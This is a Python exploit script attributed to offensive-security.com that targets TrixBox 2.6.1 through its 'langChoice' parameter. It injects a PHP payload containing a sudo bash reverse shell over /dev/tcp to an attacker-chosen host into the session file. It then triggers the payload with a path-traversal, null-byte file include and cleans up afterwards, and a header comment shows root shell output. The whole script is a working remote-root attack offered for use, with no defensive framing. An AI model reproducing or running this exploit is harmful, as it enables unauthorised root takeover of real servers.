#!/usr/bin/python
# TrixBox 2.6.1 langChoice remote root exploit
# muts from offensive-security.com
# chris from offensive-security.com
# All credits to Jean-Michel BESNARD <jmbesnard@gmail.com>
# Same same, but different.
# http://www.offensive-security.com/0day/trixbox.py.txt
##################################################################################################
# id
# uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
# uname -a
# Linux trixbox1.localdomain 2.6.25.7 #4 SMP Tue Jun 17 19:35:11 EDT 
2008 i686 i686 i386 GNU/Linux
##################################################################################################

import sys
from socket import *
import re
import os
from time import sleep

print ("[*] BY THE POWER OF GRAYSKULL - I HAVE THE ROOTZ0R!\r\n"
"[*] TrixBox 2.6.1 langChoice remote root exploit \r\n"
"[*] http://www.offensive-security.com/0day/trixbox.py.txt\r\n")

if (len(sys.argv)!=5):
	print "[*] Usage: %s <rhost> <rport> <lhost> <lport>" % 
sys.argv[0]
	exit(0)

host=sys.argv[1]
port=int(sys.argv[2])
lhost=sys.argv[3]
lport=int(sys.argv[4])


def create_post(injection):
        buffer=("POST /user/index.php HTTP/1.1 \r\n"
        "Host: 192.168.219.132 \r\n"
        "Content-Type: application/x-www-form-urlencoded \r\n"
        "Content-Length: "+str(len(injection))+"\r\n\r\n" +injection)
        return buffer

def send_post(host,port,input):
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((host, port))
	s.send(input)
	output=s.recv(1024)
	s.close()
	return output

def find_sessionid(http_output):
	headers=re.split("\n",http_output)
	for header in headers:
	        if re.search("Set-Cookie",header):
           	    	cook=header.split(" ")
			sessionid=cook[1][10:42]
	                print "[*] Session ID is %s" % sessionid
			return sessionid


print "[*] Injecting reverse shell into session file"
bash_inject="langChoice=<?php shell_exec(\"sudo /bin/bash 
0</dev/tcp/"+lhost+"/"+str(lport)+" 1>%260 2>%260\");?>" 
reverse=create_post(bash_inject)
raw_session=send_post(host,port,reverse)

print "[*] Extracting Session ID"
id=find_sessionid(raw_session)

print "[*] Triggering Reverse Shell to %s %d in 3 seconds" % 
(lhost,lport)
sleep(3)
print "[*] Skadush! \r\n[*] Ctrl+C to exit reverse shell."
tmpsession=create_post('langChoice=../../../../../../../../../../tmp/sess_'+id+'%00')
send_post(host,port,tmpsession)

print "[*] Cleaning up"
cleanup=create_post('langChoice=english')
send_post(host,port,cleanup)
send_post(host,port,cleanup)
print "[*] Done!"
